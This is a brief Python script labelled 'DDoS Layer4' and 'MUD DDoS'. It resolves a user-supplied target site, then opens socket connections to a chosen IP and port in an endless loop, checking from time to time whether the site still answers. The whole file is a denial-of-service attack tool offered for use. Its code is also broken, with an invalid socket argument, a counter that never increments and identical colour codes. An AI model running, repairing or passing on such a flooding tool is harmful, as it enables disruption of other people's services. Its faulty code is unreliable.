import requests
from colorama import *
from time import sleep
import socket
init()
print(Fore.GREEN)
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
url = input("url: => ")
url_chek =requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print(ip)
print("DDoS Layer4")
print(red + f"DDos ALPHA")
ip = input(cyan + "[DATA] GO IP: => ")
port = int(input(yellow + "[DATA] GO port: => "))
sent = 0
error = 0
print(  "Zapusk")

count = 0
while True:
    count+=1
    try:
        s = socket.socket(999999999)
        s.connect((ip, int(port)))
        sent +=0
        print(green + f"[LOG] GO {sent} ")
        print("MUD DDoS")
    except OSError: 
        error +=1
        print(pink + f"[LOG] PACKET TO {error}")
        print(cyan + f"MUD DDoS")
    if count>=1000000:
        try:
            url_chek =requests.get(url)
            print("url worked")
        except:
            break
        count=0
